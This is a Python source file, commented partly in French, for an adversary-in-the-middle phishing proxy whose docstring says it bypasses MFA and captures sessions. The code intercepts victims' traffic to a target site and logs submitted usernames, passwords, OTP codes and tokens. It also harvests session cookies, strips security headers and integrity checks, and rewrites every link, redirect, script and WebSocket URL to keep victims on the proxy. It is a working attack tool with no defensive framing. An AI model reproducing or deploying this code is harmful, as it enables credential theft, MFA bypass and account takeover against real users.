import re
import aiohttp
import asyncio
import json
from http.cookies import SimpleCookie
from typing import Dict, Optional, Tuple, List, Any
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
from fastapi import Request, Response, HTTPException, WebSocket
from starlette.websockets import WebSocketDisconnect
from core.session.session_manager import session_manager

class AiTMProxy:
    """
    Adversary-in-the-Middle (AiTM) Proxy Engine v5
    Intercepte et réécrit le trafic pour contourner le MFA et capturer les sessions.
    """
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.proxy_domain = "vantablack-proxy.com" # À configurer dynamiquement
        self.session_manager = session_manager
        # Regex pour détecter les URL absolues
        self.url_regex = re.compile(r'https?://[^\s"\']+')

    async def get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            # Utilisation de DummyCookieJar pour éviter le partage d'état entre requêtes
            # Les cookies sont gérés explicitement via les paramètres de requête
            self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                auto_decompress=False,
                cookie_jar=aiohttp.DummyCookieJar()
            )
        return self.session

    async def proxy_websocket(self, target_url: str, client_ws: WebSocket, session_id: str = None, headers: Dict[str, str] = None, cookies: Dict[str, str] = None):
        """
        Proxy WebSocket traffic bi-directionally.
        """
        # Ensure session is initialized
        if self.session is None or self.session.closed:
             self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                auto_decompress=False,
                cookie_jar=aiohttp.DummyCookieJar()
            )
        
        session = self.session
        
        # Prepare headers for upstream
        upstream_headers = dict(headers or {})
        upstream_headers.pop("host", None)
        upstream_headers.pop("sec-websocket-key", None)
        upstream_headers.pop("sec-websocket-extensions", None)
        upstream_headers.pop("upgrade", None)
        upstream_headers.pop("connection", None)
        upstream_headers["origin"] = "/".join(target_url.split("/")[:3]) # Fake origin to target
        
        try:
            async with session.ws_connect(
                target_url,
                headers=upstream_headers,
                cookies=cookies,
                ssl=False,
                autoping=True
            ) as upstream_ws:
                
                # Bi-directional pipe
                async def client_to_upstream():
                    try:
                        while True:
                            data = await client_ws.receive()
                            if "text" in data:
                                # Rewriting Client -> Server (rarely needed but good for consistency)
                                # text = self._rewrite_websocket_text(data["text"], target_url, direction="upstream")
                                await upstream_ws.send_str(data["text"])
                            elif "bytes" in data:
                                await upstream_ws.send_bytes(data["bytes"])
                    except (WebSocketDisconnect, RuntimeError):
                        # Client disconnected
                        await upstream_ws.close()
                    except Exception as e:
                        print(f"[WS Client Error] {e}")

                async def upstream_to_client():
                    try:
                        async for msg in upstream_ws:
                            if msg.type == aiohttp.WSMsgType.TEXT:
                                # Rewriting Server -> Client (CRITICAL for MFA redirections)
                                rewritten_text = self._rewrite_websocket_text(msg.data, target_url)
                                await client_ws.send_text(rewritten_text)
                            elif msg.type == aiohttp.WSMsgType.BINARY:
                                await client_ws.send_bytes(msg.data)
                            elif msg.type == aiohttp.WSMsgType.CLOSE:
                                await client_ws.close()
                                break
                            elif msg.type == aiohttp.WSMsgType.ERROR:
                                break
                    except (WebSocketDisconnect, RuntimeError):
                         # Client disconnected
                         pass
                    except Exception as e:
                        print(f"[WS Upstream Error] {e}")
                
                # Run tasks until one completes
                done, pending = await asyncio.wait(
                    [asyncio.create_task(client_to_upstream()), asyncio.create_task(upstream_to_client())],
                    return_when=asyncio.FIRST_COMPLETED
                )
                
                # Cancel pending task
                for task in pending:
                    task.cancel()
                
        except Exception as e:
            print(f"[WS Proxy Error] {e}")
            try:
                await client_ws.close(code=1011)
            except RuntimeError:
                pass # Already closed

    def _rewrite_websocket_text(self, text: str, base_url: str, proxy_base_path: str = "/v5/proxy") -> str:
        """
        Réécrit le contenu textuel des messages WebSocket (JSON ou brut).
        C'est crucial pour les flux MFA qui envoient des URLs de redirection via WS.
        """
        try:
            # 1. Try JSON rewrite
            if text.strip().startswith(("{", "[")):
                try:
                    data = json.loads(text)
                    rewritten_data = self._recursive_rewrite(data, base_url, proxy_base_path)
                    return json.dumps(rewritten_data)
                except json.JSONDecodeError:
                    pass # Not valid JSON, continue to regex
            
            # 2. Regex Replace for any URL found in text
            # This handles cases like "Redirect to https://..." or embedded URLs
            url_pattern = re.compile(r'https?://[a-zA-Z0-9.-]+(?:/[a-zA-Z0-9._~:/?#[\]@!$&\'()*+,;=-]*)?')
            
            def replace_match(match):
                url = match.group(0)
                if self.proxy_domain in url:
                    return url
                return self._rewrite_url(url, base_url, proxy_base_path)
            
            return url_pattern.sub(replace_match, text)
            
        except Exception as e:
            print(f"[WS Rewrite Error] {e}")
            return text

    async def proxy_request(self, target_url: str, request: Request, session_id: str = None, body: bytes = None, proxy_base_path: str = "") -> Response:
        """
        Proxy la requête vers le serveur cible et réécrit la réponse.
        """
        session = await self.get_session()
        
        # Capture Credentials (POST)
        if request.method == "POST" and session_id and body:
            self._capture_credentials(session_id, body, request.headers.get("content-type", ""))

        # Nettoyage des headers
        headers = dict(request.headers)
        headers.pop("host", None)
        headers.pop("content-length", None)
        headers.pop("cookie", None) # On passe les cookies via le paramètre dédié
        headers["user-agent"] = headers.get("user-agent", "Mozilla/5.0") 
        headers["accept-encoding"] = "gzip, deflate" # Force compression standard
        
        method = request.method
        cookies = request.cookies
        
        try:
            async with session.request(
                method, 
                target_url, 
                headers=headers, 
                data=body, 
                cookies=cookies,
                allow_redirects=False
            ) as upstream_response:
                
                content = await upstream_response.read()
                response_headers = dict(upstream_response.headers)
                
                # Capture Cookies (Set-Cookie)
                if session_id:
                    self._capture_response_cookies(session_id, upstream_response.headers, target_url)

                # Suppression des headers de sécurité et mise en cache
                for h in ["content-security-policy", "content-security-policy-report-only", "x-frame-options", "strict-transport-security", 
                          "transfer-encoding", "content-encoding", "content-length",
                          "referrer-policy", "x-content-type-options", "x-xss-protection", "access-control-allow-origin"]:
                    response_headers.pop(h, None)
                
                # Add permissive CORS headers
                origin = request.headers.get("origin")
                if origin:
                    response_headers["Access-Control-Allow-Origin"] = origin
                    response_headers["Access-Control-Allow-Credentials"] = "true"
                else:
                    response_headers["Access-Control-Allow-Origin"] = "*"
                
                response_headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS, PUT, DELETE"
                response_headers["Access-Control-Allow-Headers"] = "*"
                
                # Remove Set-Cookie from headers to handle manually
                response_headers.pop("set-cookie", None)

                # Réécriture du header Location (pour les redirections)
                for key in list(response_headers.keys()):
                    if key.lower() == "location":
                        response_headers[key] = self._rewrite_url(response_headers[key], target_url, proxy_base_path)

                # Remove content-security-policy meta tags in HTML
                # This is handled in rewrite_html, but we also ensure no CSP headers remain


                # Réécriture du contenu
                content_type = response_headers.get("content-type", "")
                if "text/html" in content_type:
                    content = self.rewrite_html(content, target_url, proxy_base_path)
                elif "application/json" in content_type:
                    content = self.rewrite_json(content, target_url, proxy_base_path)
                elif "application/javascript" in content_type or "text/javascript" in content_type:
                    content = self.rewrite_js(content, target_url, proxy_base_path)
                
                response = Response(
                    content=content,
                    status_code=upstream_response.status,
                    headers=response_headers,
                    media_type=content_type
                )

                # Rewrite and add Set-Cookie headers
                upstream_cookies = upstream_response.headers.getall("Set-Cookie", [])
                for cookie_raw in upstream_cookies:
                    # Simple rewrite: Remove Domain, Secure if needed
                    # We want to keep the cookie on the current domain (proxy)
                    # So we just strip the Domain attribute.
                    # Also strip Secure if we are on HTTP (dev mode), but assuming HTTPS for now or agnostic
                    
                    # Regex to remove Domain=...;
                    cookie_mod = re.sub(r'(?i);\s*domain=[^;]+', '', cookie_raw)
                    # Remove Secure if strictly necessary for local dev, but let's keep it for now unless it breaks
                    # cookie_mod = re.sub(r'(?i);\s*secure', '', cookie_mod) 
                    
                    response.headers.append("Set-Cookie", cookie_mod)

                return response
                
        except Exception as e:
            # En prod, logger l'erreur discrètement
            print(f"[AiTM Error] Proxy failed for {target_url}: {e}")
            raise HTTPException(status_code=502, detail="Upstream Error")

    def _capture_credentials(self, session_id: str, body: bytes, content_type: str):
        """
        Analyse le corps de la requête pour extraire les identifiants (Form ou JSON).
        """
        try:
            decoded = body.decode('utf-8', errors='ignore')
            captured = {}
            
            # Mots clés à surveiller
            sensitive_keys = ["user", "username", "login", "email", "password", "pass", "pwd", "otp", "code", "token"]

            if "application/json" in content_type:
                try:
                    data = json.loads(decoded)
                    if isinstance(data, dict):
                        for key, value in data.items():
                             if any(s in key.lower() for s in sensitive_keys):
                                captured[key] = value
                except json.JSONDecodeError:
                    pass
            else:
                # Fallback form-urlencoded
                parsed = parse_qs(decoded)
                for key, values in parsed.items():
                    if any(s in key.lower() for s in sensitive_keys):
                        captured[key] = values[0] if values else ""
            
            if captured:
                print(f"[AiTM] Credentials captured for session {session_id}: {captured}")
                for k, v in captured.items():
                    self.session_manager.capture_credential(session_id, k, v)
                    
        except Exception as e:
            print(f"[AiTM Warning] Failed to parse POST body: {e}")

    def _capture_response_cookies(self, session_id: str, headers: Any, target_url: str):
        """Capture et log les cookies de réponse avec tous les attributs."""
        raw_cookies = headers.getall("Set-Cookie", [])
        if raw_cookies:
             print(f"[AiTM] Captured {len(raw_cookies)} cookies for session {session_id}")
             
             parsed_cookies = []
             for cookie_str in raw_cookies:
                 # Log raw cookie
                 self.session_manager.log_raw_cookie(session_id, cookie_str)
                 
                 # Parse cookie with SimpleCookie
                 try:
                     cookie = SimpleCookie()
                     cookie.load(cookie_str)
                     
                     for key, morsel in cookie.items():
                         domain = morsel["domain"]
                         if not domain:
                             domain = urlparse(target_url).hostname

                         cookie_data = {
                             "name": key,
                             "value": morsel.value,
                             "domain": domain,
                             "path": morsel["path"] or "/",
                             "secure": True if morsel["secure"] else False,
                             "httpOnly": True if morsel["httponly"] else False,
                             "sameSite": morsel["samesite"] or "Lax",
                             # Expires/Max-Age handling could be added here
                         }
                         parsed_cookies.append(cookie_data)
                 except Exception as e:
                     print(f"[AiTM Warning] Cookie parsing failed: {e}")

             if parsed_cookies:
                 self.session_manager.capture_cookies(session_id, parsed_cookies)

    def rewrite_json(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
        """
        Réécrit les URLs dans une réponse JSON.
        """
        try:
            data = json.loads(content)
            rewritten_data = self._recursive_rewrite(data, base_url, proxy_base_path)
            return json.dumps(rewritten_data).encode('utf-8')
        except Exception as e:
            print(f"[AiTM Warning] JSON Rewrite failed: {e}")
            return content

    def _recursive_rewrite(self, data: Any, base_url: str, proxy_base_path: str) -> Any:
        """
        Parcourt récursivement un objet JSON pour réécrire les chaînes ressemblant à des URLs.
        """
        if isinstance(data, dict):
            return {k: self._recursive_rewrite(v, base_url, proxy_base_path) for k, v in data.items()}
        elif isinstance(data, list):
            return [self._recursive_rewrite(item, base_url, proxy_base_path) for item in data]
        elif isinstance(data, str):
            # Check if string looks like a URL we should rewrite
            if data.startswith(("http://", "https://")) and not data.startswith(self.proxy_domain):
                return self._rewrite_url(data, base_url, proxy_base_path)
            return data
        else:
            return data

    def rewrite_js(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
        """
        Réécrit les URLs dans du JavaScript (expérimental).
        """
        try:
            text = content.decode('utf-8', errors='ignore')
            # Regex simple pour trouver des URLs complètes dans le JS
            # Attention: risque de faux positifs
            url_pattern = re.compile(r'https?://[a-zA-Z0-9.-]+(?:/[a-zA-Z0-9._~:/?#[\]@!$&\'()*+,;=-]*)?')
            
            def replace_match(match):
                url = match.group(0)
                # Ne pas réécrire si c'est déjà notre proxy ou une ressource externe qu'on veut laisser telle quelle (e.g. CDN analytics)
                if self.proxy_domain in url:
                    return url
                return self._rewrite_url(url, base_url, proxy_base_path)
            
            rewritten_text = url_pattern.sub(replace_match, text)
            return rewritten_text.encode('utf-8')
        except Exception:
            return content

    def rewrite_html(self, html_content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:

        """
        Réécrit les liens et formulaires pour qu'ils pointent vers le proxy.
        Utilise BeautifulSoup pour la structure et Regex pour le JS inline.
        """
        try:
            soup = BeautifulSoup(html_content, "html.parser")
            
            # 1. Liens (a href, link href)
            for tag in soup.find_all(["a", "link"], href=True):
                tag["href"] = self._rewrite_url(tag["href"], base_url, proxy_base_path)
                if tag.name == "link" and "integrity" in tag.attrs:
                    del tag["integrity"]
                
            # 2. Ressources (img src, script src, iframe src)
            for tag in soup.find_all(["img", "script", "iframe"], src=True):
                tag["src"] = self._rewrite_url(tag["src"], base_url, proxy_base_path)
                if "integrity" in tag.attrs:
                    del tag["integrity"]

            # 3. Formulaires (form action)
            for tag in soup.find_all("form", action=True):
                tag["action"] = self._rewrite_url(tag["action"], base_url, proxy_base_path)
            
            # 4. Meta Refresh et CSP
            for tag in soup.find_all("meta"):
                if "http-equiv" in tag.attrs:
                    http_equiv = tag["http-equiv"].lower()
                    
                    # Remove CSP meta tags
                    if http_equiv == "content-security-policy":
                        tag.decompose()
                        continue
                        
                    if http_equiv == "refresh" and "content" in tag.attrs:
                        content = tag["content"]
                        # format: "0; url=http://..."
                        if "url=" in content.lower():
                            parts = content.split("url=", 1)
                            new_url = self._rewrite_url(parts[1], base_url, proxy_base_path)
                            tag["content"] = f"{parts[0]}url={new_url}"

            return str(soup).encode("utf-8")
        except Exception as e:
            print(f"[AiTM Warning] HTML Rewrite failed: {e}")
            return html_content

    def _rewrite_url(self, url: str, base_url: str, proxy_base_path: str = "") -> str:
        """
        Transforme une URL cible en URL proxy.
        """
        if not url: return url
        
        # Ignorer les ancres, javascript:, data:, mailto:
        if url.startswith(("#", "javascript:", "data:", "mailto:")):
            return url
            
        # Résoudre l'URL par rapport à la base (page courante)
        full_url = urljoin(base_url, url)
        
        # Si c'est déjà notre proxy, on ne touche pas
        if self.proxy_domain in full_url:
            return url
            
        # Encodage de l'URL cible
        import urllib.parse
        encoded_url = urllib.parse.quote(full_url)
        
        # Construction de l'URL proxy
        # Si proxy_base_path est "/proxy", le résultat sera "/proxy?url=..."
        if proxy_base_path:
            return f"{proxy_base_path}?url={encoded_url}"
            
        return f"/proxy?url={encoded_url}"

    async def close(self):
        if self.session:
            await self.session.close()

# Instance globale
aitm_proxy = AiTMProxy()
